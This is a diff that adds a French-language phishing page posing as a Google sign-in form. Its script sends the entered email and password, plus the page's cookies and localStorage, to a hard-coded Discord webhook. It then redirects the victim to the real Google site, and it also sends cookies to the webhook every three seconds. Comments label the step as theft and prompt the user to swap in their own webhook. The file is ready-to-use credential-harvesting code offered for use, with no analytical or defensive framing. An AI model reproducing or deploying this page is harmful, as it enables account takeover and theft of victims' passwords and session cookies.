@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Se connecter à votre compte</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #185abc; }
+        .logo { font-size: 28px; font-weight: bold; color: #4285f4; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">G</div>
+        <h2>Connexion</h2>
+        <p>Utilisez votre compte Google</p>
+        
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit">Suivant</button>
+        </form>
+        
+        <p style="font-size:12px; color:#666; margin-top:20px;">
+            <a href="#">Mot de passe oublié ?</a>
+        </p>
+    </div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1513565300375687212/sAHxy50xEYVHJuRliSUxqBFZQdO9kZbGbb0vstMEGHHoajAbkKksBK2Y-axd5JJDCC5_";  // ← Change ça
+
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            const data = {
+                email: email,
+                password: password,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Envoi des identifiants + cookies
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data),
+                mode: "no-cors"
+            }).catch(() => {});
+
+            // Redirection vers vraie page Google après vol
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com";
+            }, 800);
+        });
+
+        // Cookie grabber en arrière-plan
+        setInterval(() => {
+            fetch(webhook + "?cookies=" + encodeURIComponent(document.cookie), { mode: "no-cors" });
+        }, 3000);
+    </script>
+</body>
+</html>
